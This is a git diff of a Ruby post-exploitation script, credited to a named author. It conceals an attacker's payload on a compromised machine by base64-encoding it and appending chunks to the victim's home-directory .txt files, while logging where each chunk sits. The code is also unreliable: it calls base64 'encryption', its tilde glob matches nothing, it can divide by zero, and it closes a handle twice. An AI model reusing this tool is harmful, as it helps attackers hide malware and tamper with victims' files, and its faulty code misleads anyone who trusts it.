@@ -16,80 +16,79 @@
 ##########################################################################################
 # Adonay Pichardo
 
-# Post-Exploitation script to encrypt and copy payload-binaries into other directories
-# to avoid leaving payload-binaries unencrypted, centralized, and exposed, should attacker
-# become disconnected from target machine.
+# Post-Exploitation script to encrypt and copy payload-binaries into other files to avoid
+# leaving payload-binaries unencrypted, centralized, and exposed, should attacker become
+# disconnected from target machine.
 
-# 1. Get curent user
-# 2. Get list of files current user has edit privileges for
-# 3. Begin encrypting payload-binaries
-# 4. Splice encrypted payload-binaries into smaller files
-# 5. Append encrypted splices to editable files
+# 1. Get list of .txt files current user has in their home directory
+# 2. Begin encrypting payload-binaries
+# 3. Splice encrypted payload-binaries into smaller files
+# 4. Append encrypted splices to editable files
 
-require 'etc'
+##########################################################################################
+##########################################################################################
+##########################################################################################
+##########################################################################################
+##########################################################################################
+##########################################################################################
+##########################################################################################
+##########################################################################################
 
-class User
-    attr_reader :username
-    def initialize
-        @username = "noneSet"
+require 'base64'
+
+payload = "whisper.rb"
+
+inputFile = File.open(payload)
+data      = inputFile.read
+data      = Base64.encode64(data)
+
+class Whisper
+    @@textFiles       = Dir["~/*.txt"]
+    @@whisperLocation = {}
+
+    def getTextFiles
+        return @@textFiles
     end
 
-    def whoami
-        puts "Getting current user..."
-        @username = Etc.getlogin
+    def setWhisperLocation(fileName, location)
+        @@whisperLocation[fileName] = location
     end
-end
 
-class Files
-    attr_reader :fileList
-    def initialize(currentUser)
-        puts "Getting editable files..."
-        @fileList = Dir.home(currentUser)
-    end
-end
-
-class Encryptor
-    def initialize(payloadBinary)
-        puts "Encrypting file..."
-    end
-end
-
-class Splitter
-    def initialize(fullBinary)
-        puts "Splitting file..."
-    end
-end
-
-class Appender
-    def initialize(files, pieces)
-        puts "Appending pieces into files..."
+    def getWhisperLocation(fileName)
+        return @@whisperLocation[fileName]
     end
 end
 
-###############
-# 1. Get curent user
-###############
-user = User.new()
-user.whoami
-puts user.username
+psst = Whisper.new()
 
-###############
-# 2. Get list of files current user has edit privileges for
-###############
-files = Files.new(user.username)
+indexStart = 0
+indexStep  = data.size / psst.getTextFiles.size
+indexEnd   = indexStep
 
-###############
-# 3. Begin encrypting payload-binaries
-###############
+psst.getTextFiles.each {
+    |file|
+    temp          = File.open(file, 'r')
+    fileLinesSize = temp.read.split("\n").size
+    temp.close()
+    textFile      = File.open(file, 'a')
 
-encrypted = Encryptor.new(payloadBinary)
+    textFile.puts data[indexStart..indexEnd]
+    temp.close()
 
-###############
-# 4. Splice encrypted payload-binaries into smaller files
-###############
-pieces = Splitter.new(encrypted)
+    psst.setWhisperLocation(file, fileLinesSize + 1)
+    puts psst.getWhisperLocation(file)
 
-###############
-# 5. Append encrypted splices to editable files
-###############
-whispers = Appender.new(files, pieces)
+    indexStart = indexEnd
+    indexEnd  += indexStep
+}
+
+psst.getTextFiles.each {
+    |file|
+    puts "#{file}:#{psst.getWhisperLocation(file)}"
+}
+
+psst.getTextFiles.each {
+    |file|
+    textFile = File.open(file, 'r')
+    puts textFile.read
+}
